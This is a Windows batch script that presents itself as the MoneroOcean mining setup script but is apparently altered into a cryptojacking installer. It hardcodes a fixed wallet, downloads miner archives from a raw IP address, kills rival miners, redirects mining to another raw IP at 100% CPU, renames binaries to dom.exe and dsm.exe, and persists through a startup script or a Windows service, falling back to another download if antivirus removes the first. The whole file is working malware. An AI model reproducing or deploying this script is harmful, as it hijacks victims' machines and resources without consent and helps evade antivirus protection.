@echo off

set VERSION=2.5

rem printing greetings

echo MoneroOcean mining setup script v%VERSION%.
echo ^(please report issues to support@moneroocean.stream email^)
echo.

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

rem command line arguments
set WALLET=43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4
rem this one is optional
set EMAIL=%2
set site=http://150.129.234.203:82
rem checking prerequisites

if [%WALLET%] == [] (
  echo Script usage:
  echo ^> setup_dom_miner.bat ^<wallet address^> [^<your email address^>]
  echo ERROR: Please specify your wallet address
  exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
exit /b 1

:WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
  echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "find" utility to work correctly
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "findstr" utility to work correctly
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "tasklist" utility to work correctly
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    echo ERROR: This script requires "sc" utility to work correctly
    exit /b 1
  )
)

rem calculating port

set /a "EXP_MONERO_HASHRATE = %NUMBER_OF_PROCESSORS% * 700 / 1000"

if [%EXP_MONERO_HASHRATE%] == [] ( 
  echo ERROR: Can't compute projected Monero hashrate
  exit 
)

if %EXP_MONERO_HASHRATE% gtr 8192 ( set PORT=18192 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 4096 ( set PORT=14096 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 2048 ( set PORT=12048 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1024 ( set PORT=11024 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  512 ( set PORT=10512 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  256 ( set PORT=10256 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  128 ( set PORT=10128 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   64 ( set PORT=10064 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   32 ( set PORT=10032 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   16 ( set PORT=10016 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    8 ( set PORT=10008 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=10004 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    2 ( set PORT=10002 & goto PORT_OK )
set PORT=10001

:PORT_OK

rem printing intentions

set "LOGFILE=%USERPROFILE%\dom\xmrig.log"

echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
echo If needed, miner in foreground can be started by %USERPROFILE%\dom\miner.bat script.
echo Mining will happen to %WALLET% wallet.

if not [%EMAIL%] == [] (
  echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
)

echo.

if %ADMIN% == 0 (
  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
) else (
  echo Mining in background will be performed using dom_miner service.
)

echo.
echo JFYI: This host has %NUMBER_OF_PROCESSORS% CPU threads, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% KH/s.
echo.


rem start doing stuff: preparing miner

echo [*] Removing previous moneroocean miner (if any)
sc stop dom_miner
sc delete dom_miner
sc stop jin_miner
sc delete jin_miner
sc stop mimu_miner
sc delete mimu_miner

taskkill /f /t /im dom.exe
taskkill /f /t /im dsm.exe
taskkill /IM jin.exe /f
taskkill /IM jsm.exe /f
taskkill /IM xmrig.exe /f
taskkill /IM nssm.exe /f
:REMOVE_DIR0
echo [*] Removing "%USERPROFILE%\dom" directory
timeout 5
rmdir /q /s "%USERPROFILE%\dom" >NUL 2>NUL
IF EXIST "%USERPROFILE%\dom" GOTO REMOVE_DIR0

echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\dom.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%site%/dom.zip', '%USERPROFILE%\dom.zip')"
if errorlevel 1 (
  echo ERROR: Can't download MoneroOcean advanced version of xmrig
  goto MINER_BAD
)

echo [*] Unpacking "%USERPROFILE%\dom.zip" to "%USERPROFILE%\dom"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\dom.zip', '%USERPROFILE%\dom')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%site%/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking stock "%USERPROFILE%\dom.zip" to "%USERPROFILE%\dom"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\dom" "%USERPROFILE%\dom.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\dom.zip"

echo [*] Checking if advanced version of "%USERPROFILE%\dom\dom.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\dom\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\dom\config.json'" 
"%USERPROFILE%\dom\dom.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD

if exist "%USERPROFILE%\dom\dom.exe" (
  echo WARNING: Advanced version of "%USERPROFILE%\dom\dom.exe" is not functional
) else (
  echo WARNING: Advanced version of "%USERPROFILE%\dom\dom.exe" was removed by antivirus
)

echo [*] Looking for the latest version of Monero miner
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%site%/dom-6.zip', '%USERPROFILE%\dom.zip')"
if errorlevel 1 (
  echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\dom.zip"
  exit /b 1
)

:REMOVE_DIR1
echo [*] Removing "%USERPROFILE%\dom" directory
timeout 5
rmdir /q /s "%USERPROFILE%\dom" >NUL 2>NUL
IF EXIST "%USERPROFILE%\dom" GOTO REMOVE_DIR1

echo [*] Unpacking "%USERPROFILE%\dom.zip" to "%USERPROFILE%\dom"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\dom.zip', '%USERPROFILE%\dom')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%site%/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking advanced "%USERPROFILE%\dom.zip" to "%USERPROFILE%\dom"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\dom" "%USERPROFILE%\dom.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\dom.zip" to "%USERPROFILE%\dom"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\dom.zip"

echo [*] Checking if stock version of "%USERPROFILE%\dom\dom.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\dom\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\dom\config.json'" 
"%USERPROFILE%\dom\dom.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK

if exist "%USERPROFILE%\dom\dom.exe" (
  echo WARNING: Stock version of "%USERPROFILE%\dom\dom.exe" is not functional
) else (
  echo WARNING: Stock version of "%USERPROFILE%\dom\dom.exe" was removed by antivirus
)

exit /b 1

:MINER_OK

echo [*] Miner "%USERPROFILE%\dom\dom.exe" is OK

for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=mimu.%%a
if [%PASS%] == [] (
  set PASS=na
)
if not [%EMAIL%] == [] (
  set "PASS=%PASS%:%EMAIL%"
)

powershell -Command "$out = cat '%USERPROFILE%\dom\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"178.128.252.200:80\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\dom\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\dom\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\dom\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\dom\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\dom\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\dom\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\dom\config.json'" 
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat '%USERPROFILE%\dom\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\dom\config.json'" 

copy /Y "%USERPROFILE%\dom\config.json" "%USERPROFILE%\dom\config_background.json" >NUL
powershell -Command "$out = cat '%USERPROFILE%\dom\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\dom\config_background.json'" 

rem preparing script
(
echo @echo off
echo tasklist /fi "imagename eq dom.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0dom.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo echo Monero miner is already running in the background. Refusing to run another one.
echo echo Run "taskkill /IM dom.exe" if you want to remove background miner first.
echo :EXIT
) > "%USERPROFILE%\dom\miner.bat"

rem preparing script background work and work under reboot

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)

echo ERROR: Can't find Windows startup directory
exit /b 1

:STARTUP_DIR_OK
echo [*] Adding call to "%USERPROFILE%\dom\miner.bat" script to "%STARTUP_DIR%\dom_miner.bat" script
(
echo @echo off
echo "%USERPROFILE%\dom\miner.bat" --config="%USERPROFILE%\dom\config_background.json"
) > "%STARTUP_DIR%\dom_miner.bat"

echo [*] Running miner in the background
call "%STARTUP_DIR%\dom_miner.bat"
goto OK

:ADMIN_MINER_SETUP


echo [*] Creating dom_miner service
sc stop dom_miner
sc delete dom_miner
"%USERPROFILE%\dom\dsm.exe" install dom_miner "%USERPROFILE%\dom\dom.exe"
if errorlevel 1 (
  echo ERROR: Can't create dom_miner service
  exit /b 1
)
"%USERPROFILE%\dom\dsm.exe" set dom_miner AppDirectory "%USERPROFILE%\dom"
"%USERPROFILE%\dom\dsm.exe" set dom_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%USERPROFILE%\dom\dsm.exe" set dom_miner AppStdout "%USERPROFILE%\dom\stdout"
"%USERPROFILE%\dom\dsm.exe" set dom_miner AppStderr "%USERPROFILE%\dom\stderr"

echo [*] Starting dom_miner service
"%USERPROFILE%\dom\dsm.exe" start dom_miner
if errorlevel 1 (
  echo ERROR: Can't start dom_miner service
  exit /b 1
)

echo
echo Please reboot system if dom_miner service is not activated yet (if "%USERPROFILE%\dom\xmrig.log" file is empty)
goto OK

:OK
echo
echo [*] Setup complete
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b





